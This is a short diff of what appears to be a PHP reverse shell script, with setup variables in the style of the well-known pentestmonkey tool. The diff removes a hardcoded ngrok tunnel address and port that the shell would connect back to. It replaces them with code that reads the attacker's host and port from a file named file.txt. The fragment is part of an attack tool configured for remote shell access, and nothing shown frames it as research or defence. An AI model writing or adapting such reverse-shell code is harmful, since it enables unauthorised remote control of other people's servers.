@@ -4,9 +4,16 @@
 
 set_time_limit (0);
 $VERSION = "1.0";
-$ip = '2.tcp.eu.ngrok.io';
-// 2.tcp.eu.ngrok.io:28338
-$port = 27664;
+$contenu = trim(file_get_contents('file.txt'));
+$parties = explode(':', $contenu, 2);
+
+$avant = $parties[0];
+$apres = $parties[1] ?? '';
+
+$ip = $avant;
+
+$port = $apres;
+
 $chunk_size = 1400;
 $write_a = null;
 $error_a = null;
